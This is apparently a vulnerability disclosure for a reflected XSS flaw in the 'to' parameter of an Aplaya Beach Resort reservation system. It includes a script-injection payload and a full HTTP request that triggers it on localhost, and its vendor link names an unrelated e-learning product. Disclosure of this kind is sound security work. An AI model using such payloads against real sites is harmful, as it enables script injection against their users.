Vulnerability discovery author:Qianyongcun

Aplaya Beach Resort Online Reservation System – reflected XSS on (Aplaya/index.php to parameter) 

Vendor Homepage:
https://www.sourcecodester.com/php/14787/elearning-system-using-phpmysqli-source-code.html 

Version:V1.0
Tested on: PHP, Apache, MySQL

Affected Page:
Aplaya/index.php 
On this page,to parameter is vulnerable to reflected XSS Attack 
Proof of vulnerability:
Visit this page：http://localhost/aplaya/index.php 

Payload：
“><script>alert(1)</script>
Request with payload:
POST /Aplaya/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 60
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=g883r0l08f296hfd9582abk9v0
Origin: http://localhost
Referer: http://localhost/Aplaya/
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

avail=&from=1&to="><script>alert(1)</script>
Trigger popup：

<img width="416" alt="image" src="https://github.com/qqqyc/vlun1/assets/53200267/54f9670d-1ef1-4ba1-bb31-2f3cb1c38ddb">
